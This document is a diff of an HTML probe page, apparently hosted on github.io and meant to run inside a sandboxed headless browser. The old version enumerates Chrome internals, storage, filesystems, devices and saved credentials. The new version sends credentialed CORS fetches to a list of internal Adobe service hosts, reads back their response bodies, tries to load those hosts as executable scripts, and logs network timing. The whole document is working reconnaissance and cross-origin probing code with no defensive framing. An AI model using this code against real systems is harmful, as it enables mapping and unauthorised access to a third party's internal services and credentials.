@@ -1,228 +1,151 @@
-<html><body style="background:#fff;color:#000;font-family:monospace;font-size:10px;margin:4px;line-height:1.2;">
-<b>v10 ChromeAPI+FS</b>
+<html><body style="background:#fff;color:#000;font-family:monospace;font-size:9px;margin:4px;line-height:1.15;">
+<b>v11 CORSFetch+ScriptSrc</b>
 <pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;margin:0;"></pre>
-<div id="frames" style="margin-top:4px;"></div>
+<div id="s"></div>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
 
-L('UA: '+navigator.userAgent.substring(0,80));
-L('Cores:'+navigator.hardwareConcurrency+' Mem:'+(navigator.deviceMemory||'?')+'GB GL:SwiftShader');
+L('v11 Cores:'+navigator.hardwareConcurrency);
 
-// === CHROME-SPECIFIC APIs ===
-L('\n== chrome.loadTimes ==');
-try{
-  var lt=chrome.loadTimes();
-  L(JSON.stringify(lt));
-}catch(e){L('ERR: '+e.message);}
-
-L('\n== chrome.csi ==');
-try{
-  var csi=chrome.csi();
-  L(JSON.stringify(csi));
-}catch(e){L('ERR: '+e.message);}
-
-L('\n== chrome.app ==');
-try{
-  L('isInstalled: '+chrome.app.isInstalled);
-  L('installState: '+chrome.app.installState);
-  L('runningState: '+chrome.app.runningState);
-  L('getDetails: '+JSON.stringify(chrome.app.getDetails()));
-  L('keys: '+Object.keys(chrome.app).join(','));
-  for(var k in chrome.app){
-    if(typeof chrome.app[k]!=='function')L('  '+k+'='+JSON.stringify(chrome.app[k]));
-  }
-}catch(e){L('ERR: '+e.message);}
-
-L('\n== chrome (all) ==');
-try{
-  for(var k in chrome){
-    L('  chrome.'+k+' = '+typeof chrome[k]);
-    if(typeof chrome[k]==='function'){
-      try{var r=chrome[k]();L('    ()='+JSON.stringify(r).substring(0,300));}catch(ee){}
-    }else if(typeof chrome[k]==='object'&&chrome[k]!==null){
-      try{L('    keys='+Object.keys(chrome[k]).join(','));}catch(ee){}
-    }
-  }
-}catch(e){L('ERR: '+e.message);}
-
-// === FILESYSTEM API ===
-L('\n== webkitRequestFileSystem ==');
-try{
-  // TEMPORARY filesystem
-  webkitRequestFileSystem(0, 1024*1024, function(fs){
-    R.textContent+='FS name: '+fs.name+'\n';
-    R.textContent+='FS root: '+fs.root.fullPath+'\n';
-    var reader=fs.root.createReader();
-    reader.readEntries(function(entries){
-      R.textContent+='FS entries: '+entries.length+'\n';
-      entries.forEach(function(e){
-        R.textContent+='  '+e.fullPath+' isFile='+e.isFile+' isDir='+e.isDirectory+'\n';
-      });
-    },function(e){R.textContent+='FS readErr: '+e.message+'\n';});
-  },function(e){
-    R.textContent+='FS tempErr: '+e.message+'\n';
-  });
-}catch(e){L('FS temp: '+e.message);}
-
-try{
-  // PERSISTENT filesystem
-  webkitRequestFileSystem(1, 1024*1024, function(fs){
-    R.textContent+='FS-P name: '+fs.name+'\n';
-    var reader=fs.root.createReader();
-    reader.readEntries(function(entries){
-      R.textContent+='FS-P entries: '+entries.length+'\n';
-      entries.forEach(function(e){
-        R.textContent+='  '+e.fullPath+'\n';
-      });
-    },function(e){R.textContent+='FS-P readErr: '+e.message+'\n';});
-  },function(e){
-    R.textContent+='FS-P err: '+e.message+'\n';
-  });
-}catch(e){L('FS persist: '+e.message);}
-
-// === RESOLVE LOCAL FILESYSTEM URL ===
-L('\n== webkitResolveLocalFileSystemURL ==');
-var fsUrls=[
-  'filesystem:https://chenzhixin13149201-cell.github.io/temporary/',
-  'filesystem:https://chenzhixin13149201-cell.github.io/persistent/',
-  'filesystem:chrome://temporary/',
-  'filesystem:chrome-extension://temporary/'
+// === CORS-MODE FETCH (if any internal svc allows CORS, we read full response!) ===
+var targets=[
+  ['https://senseicore-ue1.adobe.io/','sensei'],
+  ['https://senseicore-ue1.adobe.io/health','sensei-h'],
+  ['https://senseicore-ue1.adobe.io/services/v2/predict','sensei-p'],
+  ['https://dc-argus.adobe.io/','argus'],
+  ['https://dc-argus.adobe.io/health','argus-h'],
+  ['https://dc-argus.adobe.io/api/v1/status','argus-st'],
+  ['https://platform-cs-jpn3.adobe.io/','platcs'],
+  ['https://platform-cs-jpn3.adobe.io/health','platcs-h'],
+  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/','genai'],
+  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/health','genai-h'],
+  ['https://dc-graph-proxy.adobe.io/','graphprx'],
+  ['https://dc-graph-proxy.adobe.io/health','graphprx-h'],
+  ['https://dcdiscovery.adobe.io/','disc'],
+  ['https://dcdiscovery.adobe.io/health','disc-h'],
+  ['https://dc-api-v2-jpn3.adobe.io/','dcapi'],
+  ['https://dc-api-v2-jpn3.adobe.io/health','dcapi-h'],
+  ['https://platform-cs-edge-jpn3.adobe.io/','edge'],
+  ['https://pdfnow.adobe.io/','pdfnow'],
+  ['https://pdfnow.adobe.io/health','pdfnow-h']
 ];
-fsUrls.forEach(function(u){
-  try{
-    webkitResolveLocalFileSystemURL(u,function(entry){
-      R.textContent+='RESOLVED '+u+': '+entry.fullPath+' isFile='+entry.isFile+'\n';
-    },function(e){
-      R.textContent+=u+': '+e.name+'\n';
-    });
-  }catch(e){R.textContent+=u+': CATCH '+e.message+'\n';}
+
+// Fire ALL fetch probes simultaneously with CORS mode
+targets.forEach(function(t){
+  // Default mode (cors) - will succeed if server sends CORS headers
+  fetch(t[0],{mode:'cors',credentials:'include'}).then(function(resp){
+    var cors=resp.headers.get('access-control-allow-origin');
+    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+' cors='+cors+'\n';
+    if(resp.type!=='opaque'&&resp.status>0){
+      resp.text().then(function(body){
+        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,500)+'\n';
+      });
+    }
+  }).catch(function(e){
+    R.textContent+=t[1]+': CORS-ERR '+e.message+'\n';
+  });
+
+  // Also try no-cors to see if request reaches
+  fetch(t[0],{mode:'no-cors'}).then(function(resp){
+    R.textContent+=t[1]+'-nc: type='+resp.type+'\n';
+  }).catch(function(e){
+    R.textContent+=t[1]+'-nc: ERR '+e.message+'\n';
+  });
 });
 
-// === STORAGE APIs ===
-L('\n== Storage ==');
-try{
-  navigator.storage.estimate().then(function(est){
-    R.textContent+='StorageEst: quota='+est.quota+' usage='+est.usage+'\n';
-    if(est.usageDetails)R.textContent+='  details='+JSON.stringify(est.usageDetails)+'\n';
+// === FETCH TO INTERESTING PATHS (might have CORS) ===
+var extraPaths=[
+  ['https://senseicore-ue1.adobe.io/api/','sensei-api'],
+  ['https://senseicore-ue1.adobe.io/version','sensei-ver'],
+  ['https://senseicore-ue1.adobe.io/status','sensei-stat'],
+  ['https://senseicore-ue1.adobe.io/metrics','sensei-metr'],
+  ['https://dc-argus.adobe.io/api/','argus-api'],
+  ['https://dc-argus.adobe.io/version','argus-ver'],
+  ['https://dc-argus.adobe.io/metrics','argus-metr'],
+  ['https://platform-cs-jpn3.adobe.io/api/','platcs-api'],
+  ['https://platform-cs-jpn3.adobe.io/version','platcs-ver'],
+  ['https://platform-cs-jpn3.adobe.io/metrics','platcs-metr'],
+  ['https://dcdiscovery.adobe.io/1785845424/index','disc-idx'],
+  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/api/','genai-api'],
+  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/version','genai-ver']
+];
+
+extraPaths.forEach(function(t){
+  fetch(t[0],{mode:'cors'}).then(function(resp){
+    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+'\n';
+    if(resp.type!=='opaque'&&resp.status>0){
+      resp.text().then(function(body){
+        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,400)+'\n';
+      });
+    }
+  }).catch(function(e){
+    R.textContent+=t[1]+': '+e.message.substring(0,60)+'\n';
   });
-}catch(e){L('storage: '+e.message);}
+});
 
-try{
-  navigator.storage.getDirectory().then(function(dir){
-    R.textContent+='OPFS root: '+dir.name+' kind='+dir.kind+'\n';
-    dir.keys().then(function(keys){
-      var arr=[];
-      var reader=keys;
-      function readNext(){
-        reader.next().then(function(r){
-          if(r.done){R.textContent+='OPFS keys: '+JSON.stringify(arr)+'\n';return;}
-          arr.push(r.value);readNext();
-        });
-      }
-      readNext();
-    });
-  });
-}catch(e){L('OPFS: '+e.message);}
-
-// Caches
-try{
-  caches.keys().then(function(names){
-    R.textContent+='Caches: '+JSON.stringify(names)+'\n';
-  });
-}catch(e){L('caches: '+e.message);}
-
-// IndexedDB
-try{
-  indexedDB.databases().then(function(dbs){
-    R.textContent+='IDB: '+dbs.length+(dbs.length>0?' '+JSON.stringify(dbs):'')+'\n';
-  });
-}catch(e){L('IDB: '+e.message);}
-
-// === CREDENTIALS API ===
-L('\n== Credentials ==');
-try{
-  navigator.credentials.get({password:true}).then(function(c){
-    R.textContent+='Cred: '+JSON.stringify(c)+'\n';
-  }).catch(function(e){R.textContent+='Cred err: '+e.message+'\n';});
-}catch(e){L('cred: '+e.message);}
-
-// === USB/BLUETOOTH/SERIAL/HID ===
-L('\n== Devices ==');
-try{L('usb: '+(navigator.usb?'available':'no'));}catch(e){}
-try{L('bluetooth: '+(navigator.bluetooth?'available':'no'));}catch(e){}
-try{L('serial: '+(navigator.serial?'available':'no'));}catch(e){}
-try{L('hid: '+(navigator.hid?'available':'no'));}catch(e){}
-try{
-  navigator.usb.getDevices().then(function(d){R.textContent+='USB devices: '+d.length+'\n';});
-}catch(e){}
-try{
-  navigator.hid.getDevices().then(function(d){R.textContent+='HID devices: '+d.length+'\n';});
-}catch(e){}
-
-// === WINDOW PROPERTIES ===
-L('\n== Window ==');
-L('opener: '+window.opener);
-L('parent===self: '+(window.parent===window));
-L('top===self: '+(window.top===window));
-L('frameElement: '+window.frameElement);
-L('closed: '+window.closed);
-L('isSecureContext: '+window.isSecureContext);
-L('crossOriginIsolated: '+window.crossOriginIsolated);
-
-// === INTERESTING GLOBAL OBJECTS ===
-L('\n== Globals ==');
-try{L('SharedArrayBuffer: '+(typeof SharedArrayBuffer));}catch(e){}
-try{L('Atomics: '+(typeof Atomics));}catch(e){}
-try{L('WebAssembly: '+(typeof WebAssembly));}catch(e){}
-try{L('OffscreenCanvas: '+(typeof OffscreenCanvas));}catch(e){}
-try{L('BroadcastChannel: '+(typeof BroadcastChannel));}catch(e){}
-try{L('ReportingObserver: '+(typeof ReportingObserver));}catch(e){}
-
-// === DYNAMIC IFRAMES (compact, check if any load) ===
-L('\n== Iframes ==');
-var targets=[
+// === SCRIPT SRC (if response is JS, it executes in our context) ===
+L('\n== ScriptSrc ==');
+var S=document.getElementById('s');
+var scriptTargets=[
   'https://senseicore-ue1.adobe.io/',
   'https://dc-argus.adobe.io/',
-  'https://platform-cs-jpn3.adobe.io/',
-  'https://dc-genai-content-platform-v2-jpn3.adobe.io/',
-  'https://dc-graph-proxy.adobe.io/',
   'https://dcdiscovery.adobe.io/',
-  'https://dc-api-v2-jpn3.adobe.io/'
+  'https://dc-graph-proxy.adobe.io/',
+  'https://platform-cs-jpn3.adobe.io/'
 ];
-var F=document.getElementById('frames');
-targets.forEach(function(url){
-  var label=url.replace('https://','').replace('.adobe.io/','');
-  var p=document.createElement('div');
-  p.style.cssText='font-size:8px;color:#000;margin:1px 0;';
-  p.textContent=label+':';
-  F.appendChild(p);
-  var ifr=document.createElement('iframe');
-  ifr.src=url;
-  ifr.style.cssText='width:100%;height:60px;border:1px solid red;background:#eee;';
-  ifr.onload=function(){
-    try{
-      R.textContent+='iframe '+label+' loaded, doc='+ifr.contentDocument.title+'\n';
-    }catch(e){
-      R.textContent+='iframe '+label+' loaded (cross-origin)\n';
-    }
-  };
-  ifr.onerror=function(){R.textContent+='iframe '+label+' error\n';};
-  F.appendChild(ifr);
+
+// Capture errors from script loading
+window.onerror=function(msg,src,line,col,err){
+  R.textContent+='SCRIPT_ERR: '+msg+' src='+src+' line='+line+'\n';
+  return true;
+};
+
+scriptTargets.forEach(function(url){
+  var sc=document.createElement('script');
+  sc.src=url;
+  sc.crossOrigin='anonymous';
+  sc.onerror=function(){R.textContent+='script-err: '+url.substring(8,40)+'\n';};
+  sc.onload=function(){R.textContent+='script-ok: '+url.substring(8,40)+' EXECUTED!\n';};
+  S.appendChild(sc);
 });
 
-// Also try object tag for one
-var obj=document.createElement('object');
-obj.data='https://senseicore-ue1.adobe.io/';
-obj.type='text/html';
-obj.style.cssText='width:100%;height:60px;border:1px solid blue;';
-F.appendChild(obj);
+// === SERVICE WORKER ===
+L('\n== SW ==');
+try{
+  navigator.serviceWorker.register('/sw.js').then(function(reg){
+    R.textContent+='SW registered: scope='+reg.scope+'\n';
+  }).catch(function(e){
+    R.textContent+='SW reg err: '+e.message+'\n';
+  });
+}catch(e){L('SW: '+e.message);}
 
-// Busy wait
-L('\n== Wait 8s ==');
+// === REPORTING OBSERVER ===
+try{
+  var ro=new ReportingObserver(function(reports){
+    reports.forEach(function(r){
+      R.textContent+='REPORT: type='+r.type+' url='+r.url+' body='+JSON.stringify(r.body).substring(0,200)+'\n';
+    });
+  },{types:['deprecation','intervention','crash'],buffered:true});
+  ro.observe();
+}catch(e){L('RO: '+e.message);}
+
+// === PERFORMANCE OBSERVER (catch resource timing for all fetches) ===
+try{
+  var po=new PerformanceObserver(function(list){
+    list.getEntries().forEach(function(e){
+      if(e.name.indexOf('github')>-1||e.entryType!=='resource')return;
+      var n=e.name.replace('https://','').substring(0,50);
+      R.textContent+='PERF '+n+' dns='+(e.domainLookupEnd-e.domainLookupStart).toFixed(0)+' tcp='+(e.connectEnd-e.connectStart).toFixed(0)+' ttfb='+(e.responseStart-e.requestStart).toFixed(0)+' sz='+e.transferSize+'\n';
+    });
+  });
+  po.observe({type:'resource',buffered:true});
+}catch(e){L('PO: '+e.message);}
+
+// === BUSY WAIT (async results fire AFTER this) ===
+L('\n== Wait 10s ==');
 var start=Date.now();
-while(Date.now()-start<8000){}
-L('Done t='+(Date.now()-start)+'ms');
-L('== END v10 ==');
+while(Date.now()-start<10000){}
+L('BusyDone t='+(Date.now()-start)+'ms');
 </script>
 </body></html>
